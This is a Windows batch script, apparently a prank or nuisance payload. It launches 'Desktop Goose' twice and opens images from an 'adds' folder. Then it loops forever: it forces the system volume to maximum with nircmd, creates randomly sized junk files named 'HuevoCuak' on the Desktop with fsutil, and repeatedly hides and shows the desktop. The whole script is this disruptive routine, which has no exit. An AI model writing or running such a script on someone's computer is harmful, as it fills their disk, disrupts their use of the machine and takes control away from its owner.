@echo off

rem -----------------------
start "" "%USERPROFILE%\Goose\GooseDesktop.exe"
start "" "%USERPROFILE%\Goose\GooseDesktop.exe"
start /B "" "%USERPROFILE%\adds\1.jpg"
start /B "" "%USERPROFILE%\adds\2.jpg"
start /B "" "%USERPROFILE%\adds\3.jpg"
rem -----------------------

:loop
%USERPROFILE%\adds\nircmd-x64\nircmd.exe setsysvolume 65535
fsutil file createnew %USERPROFILE%\Desktop\HuevoCuak.%random% %random%00
timeout /nobreak 2 >nul
%USERPROFILE%\adds\nircmd-x64\nircmd.exe setsysvolume 65535
%USERPROFILE%\adds\nircmd-x64\nircmd.exe nircmd.exe win hide class progman
timeout /nobreak 2 >nul
%USERPROFILE%\adds\nircmd-x64\nircmd.exe setsysvolume 65535
%USERPROFILE%\adds\nircmd-x64\nircmd.exe nircmd.exe win show class progman
goto :loop



